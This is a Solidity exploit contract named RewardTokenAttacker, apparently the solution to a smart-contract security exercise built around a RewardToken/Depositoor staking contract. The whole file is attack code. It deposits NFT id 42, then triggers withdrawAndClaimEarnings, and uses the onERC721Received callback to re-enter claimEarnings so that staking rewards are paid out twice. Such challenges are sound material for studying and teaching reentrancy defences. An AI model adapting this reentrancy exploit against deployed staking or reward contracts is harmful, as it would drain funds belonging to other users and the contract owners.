// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {Depositoor,NftToStake} from "../RewardToken.sol";
contract RewardTokenAttacker is IERC721Receiver{
    Depositoor depositor;
 
    function deposit(address nft, address depositor) public {
        NftToStake(nft).safeTransferFrom(address(this),depositor,42);

    }
    function withdrawAndAttack(address depositor_)public {
        Depositoor(depositor_).withdrawAndClaimEarnings(42);
    }

    // function normalClaim(address depositor_) public {
    //     Depositoor(depositor_).claimEarnings(42);
    // }   

    function onERC721Received(
        address from, 
        address ,
        uint256 tokenId,
        bytes calldata
    ) external override returns (bytes4) {
        depositor = Depositoor(from);
        depositor.claimEarnings(tokenId);
  
        return IERC721Receiver.onERC721Received.selector;
    }
}